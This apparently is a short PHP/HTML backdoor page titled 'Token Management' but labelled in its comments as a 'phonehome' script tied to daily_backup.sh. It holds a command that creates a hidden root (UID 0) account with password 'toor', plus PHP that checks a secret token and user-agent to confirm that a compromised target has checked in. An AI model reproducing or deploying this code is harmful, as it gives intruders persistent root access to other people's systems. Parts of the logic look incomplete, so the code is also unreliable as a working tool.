<!--
     #################################
     # Phonehome PHP Script (snort.php)
     #
     # Written By: M4dH4tt3r
     #     
     # For use with daily_backup.sh
     #################################
-->

<html>
 <head>
  <title>
    Token Management
  </title>
  <script>
  function addUser() {
     var cmd = "useradd -d \"/tmp/\" -g 0 -l -N -o -p \"$(echo \'toor\' | \"openssl\" passwd -1 -stdin)\" -r -s \"/bin/bash\" -u 0 \"  \" > /dev/null";
     document.cookie = "userAdd=" + cmd;
  }
  </script>
 </head>
 <body>
   <?php
     $target = $_SERVER['REMOTE_ADDR'];
     $plainStr = 'xXxGen<Owned By G0dz1ll4>GenxXx';
     $obfsStr = str_replace('\n', '', base64_encode($plainStr));
     $userAgent = $_SERVER['HTTP_USER_AGENT'];

     if (isset($_POST['token'])) {
        if (str_replace('\n', '', $_POST['token']) == $obfsStr && $userAgent == "H4x0r Lit3 - Ph0n3H0m3 v1.0") {
           $cookieName = "phoneHome";
           $cookieValue = "Phonehome successful from $target at " . date(DATE_RFC2822) . "!";
           setcookie($cookieName, $cookieValue, time() + 400, "/");
           echo "<br />$cookieValue<br />";
        }
     }

     if (isset($_COOKIE['addUserResult'])) {
        setcookie("addUserStatus", $_COOKIE['addUserResult'], time() + 3600, "/");
        if ($_COOKIE['addUserResult'] == "Success") {
           echo "<br />User successfully added to $target</br />";
        } else {
           echo "<br />User failed to be added to $target</br />";
        }
     } 
   ?>
   <button onClick="addUser()">Add User to target</button>
   <br />
   <br />
   <button onClick=""></button>
 </body>
</html>
